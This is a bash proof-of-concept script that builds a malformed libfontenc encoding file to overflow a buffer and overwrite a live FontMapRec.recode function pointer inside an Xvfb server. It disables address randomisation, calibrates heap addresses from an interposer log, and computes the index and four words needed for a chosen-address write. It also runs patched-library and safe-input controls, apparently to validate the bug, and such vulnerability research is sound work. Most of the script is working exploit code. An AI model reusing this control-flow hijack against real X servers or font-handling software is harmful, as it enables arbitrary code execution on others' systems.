#!/bin/bash
# W187: chosen-address overwrite of a live FontMapRec.recode inside a real
# loopback Xvfb.  Phase 1 calibrates the buffer base and benign marker address
# from the interposer log; phase 2 computes the setCode index and four words.
# Fixed and safe-input controls included.
set -u
HERE=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
BASE=$(CDPATH= cd -- "$HERE/../.." && pwd)
TMP="$BASE/realpath/tmp/xfptr"
OUT="$BASE/realpath/evidence/xfptr"
FONTS="$TMP/fonts"
VULN="$BASE/build-vuln/out-plain/libfontenc.so.1.0.0"
FIXED="$BASE/build-fixed/out-plain/libfontenc.so.1.0.0"
XLFD='-urw-nimbus mono ps-regular-r-normal--0-0-0-0-p-0-crafted-1'
mkdir -p "$FONTS" "$OUT"
cc -shared -fPIC -O0 -g -I"$BASE/src" -o "$TMP/interpose.so" "$HERE/interpose.c" -ldl

# W188: decoy mappings must be numerous enough that the target map's
# ENDMAPPING (which initialises its recode) runs before the four word writes.
# A clean replay put the first post-buffer map at n=5, so 3 decoys were too
# few: mapping n=5 reinitialised itself after the first two marker words.
DECOYS=8
# $1 rows; $2..$5 from values; $6..$9 hex words (without 0x)
write_enc() {
    local rows=$1 f0=$2 f1=$3 f2=$4 f3=$5 w0=$6 w1=$7 w2=$8 w3=$9
    local i
    {
    printf 'STARTENCODING crafted-1\nSIZE 256 %s\n' "$rows"
    for ((i=1; i<=DECOYS; i++)); do
        if [ "$i" -le 2 ]; then
            printf 'STARTMAPPING cmap 3 1\n'
        else
            printf 'STARTMAPPING unicode\n'
        fi
        if [ "$i" -eq 2 ]; then printf '0xff00 0x1111\n'; else printf '0x0000 0x0001\n'; fi
        printf 'ENDMAPPING\n'
    done
    printf 'STARTMAPPING unicode\n%s 0x%s\nENDMAPPING\n' "$f0" "$w0"
    printf 'STARTMAPPING unicode\n%s 0x%s\nENDMAPPING\n' "$f1" "$w1"
    printf 'STARTMAPPING unicode\n%s 0x%s\nENDMAPPING\n' "$f2" "$w2"
    printf 'STARTMAPPING unicode\n%s 0x%s\nENDMAPPING\n' "$f3" "$w3"
    printf 'ENDENCODING\n'
    } > "$FONTS/crafted-1.enc"
}

prep_fonts() {
    cp "$HERE/type1fonts/NimbusMonoPS-Regular.pfb" "$HERE/type1fonts/fonts.dir" \
       "$HERE/type1fonts/encodings.dir" "$FONTS/"
}
start_xvfb() { # lib disp
    MALLOC_MMAP_THRESHOLD_=262144 LD_PRELOAD="$TMP/interpose.so:$1" \
      setarch x86_64 -R Xvfb ":$2" -screen 0 640x480x24 -nolisten tcp \
      -noreset -fp "$FONTS" > "$TMP/$2.xvfb.log" 2>&1 &
    echo $!
}
load_font() { DISPLAY=":$1" "$HERE/xfon-load" ":$1" "$XLFD" > "$TMP/$1.client" 2>&1 || true; sleep 1; }
stop_xvfb() { kill "$1" 2>/dev/null || true; wait "$1" 2>/dev/null || true; }
hex() { echo "$((16#${1#0x}))"; }

# Phase 1: in-bounds input, read buffer base, first post-buffer map, marker.
prep_fonts
write_enc 256 0xfe24 0xfe25 0xfe26 0xfe27 9159 f7fb 7fff 0000
pid=$(start_xvfb "$VULN" 1520); sleep 3; load_font 1520; stop_xvfb "$pid"
cal="$TMP/cal.txt"
grep -E 'LF_MARKER_ADDR|LF_BUF|LF_FIND_MAP n=' "$TMP/1520.xvfb.log" > "$cal"
buf=$(grep 'LF_BUF' "$cal" | head -1 | sed -E 's/.*=//')
# W188: the first map allocated after the buffer is not always n=3. Select
# the lowest n>=3 (unicode mappings follow the two cmap decoys) whose address
# is above the buffer, and require it to be initialised before the word writes.
m3=
m3n=
while read -r n m; do
    case "$n" in ''|*[!0-9]*) continue;; esac
    [ "$n" -ge 3 ] || continue
    if [ -n "$m" ] && [ "$(hex "$m")" -gt "$(hex "$buf")" ]; then
        m3=$m; m3n=$n; break
    fi
done < <(sed -nE 's/.*LF_FIND_MAP n=([0-9]+) m=([^ ]+).*/\1 \2/p' "$cal")
marker=$(grep 'LF_MARKER_ADDR' "$cal" | tail -1 | sed -E 's/.*=//')
if [ -z "$buf" ] || [ -z "$m3" ] || [ -z "$marker" ] || [ -z "$m3n" ]; then echo 'CALIBRATION FAILED'; exit 2; fi
if [ "$m3n" -gt "$DECOYS" ]; then echo "TARGET n$m3n NOT BEFORE WORD WRITES (DECOYS=$DECOYS)"; exit 2; fi
idx=$(( ( $(hex "$m3") + 0x10 - $(hex "$buf") ) / 2 ))
base=$(( (idx / 258) * 256 + idx % 258 ))
wm=$(hex "$marker")
set -- $(printf '0x%x ' $((base)) $((base+1)) $((base+2)) $((base+3))) \
       $(printf '%04x %04x %04x %04x' $((wm & 0xffff)) $(((wm >> 16) & 0xffff)) \
         $(((wm >> 32) & 0xffff)) $(((wm >> 48) & 0xffff)))
F0=$1; F1=$2; F2=$3; F3=$4; W0=$5; W1=$6; W2=$7; W3=$8
printf 'buffer=%s target=n%s m3=%s marker=%s idx=%s from=%s %s %s %s words=%s %s %s %s\n' \
    "$buf" "$m3n" "$m3" "$marker" "$idx" "$F0" "$F1" "$F2" "$F3" "$W0" "$W1" "$W2" "$W3" \
    | tee "$OUT/matrix.txt"

# Phase 2: crafted (vulnerable twice, fixed) and safe-input controls.
run_case() { # tag lib rows disp
    tag=$1; lib=$2; rows=$3; disp=$4
    [ -f "$lib" ] || { echo "MISSING LIB $lib" >&2; exit 2; }
    prep_fonts
    write_enc "$rows" "$F0" "$F1" "$F2" "$F3" "$W0" "$W1" "$W2" "$W3"
    pid=$(start_xvfb "$lib" "$disp"); sleep 3; load_font "$disp"; stop_xvfb "$pid"
    log="$TMP/$disp.xvfb.log"
    {
        echo "# $tag — filtered distinctive lines from raw Xvfb stderr"
        echo "# recode_call_count=$(grep -c LF_RECODE_MAP "$log")"
        echo "# marker_call_count=$(grep -c LF_XVFB_MARKER "$log")"
        grep -E 'LF_MARKER_ADDR|LF_BUF|LF_FIND charset|LF_FIND_MAP|LF_RECODE_MAP' "$log" | sort -u
        grep -iE 'error|fatal|abort|segfault' "$log" | sort -u | head -5
    } > "$OUT/$tag.xvfb.txt"
    m3r=$(grep "LF_FIND_MAP n=$m3n" "$log" | tail -1 | sed -E 's/.*recode=//')
    rc=$(grep 'LF_RECODE_MAP' "$log" | sed -E 's/.*=//' | sort -u | tr '\n' ',')
    printf '%s marker_calls=%s m3_recode=%s recode_targets=%s\n' \
        "$tag" "$(grep -c LF_XVFB_MARKER "$log" || true)" "$m3r" "$rc" | tee -a "$OUT/matrix.txt"
}
run_case vuln-crafted-a "$VULN" 258 1521
run_case vuln-crafted-b "$VULN" 258 1522
run_case vuln-safe "$VULN" 256 1523
run_case fixed-crafted "$FIXED" 258 1524
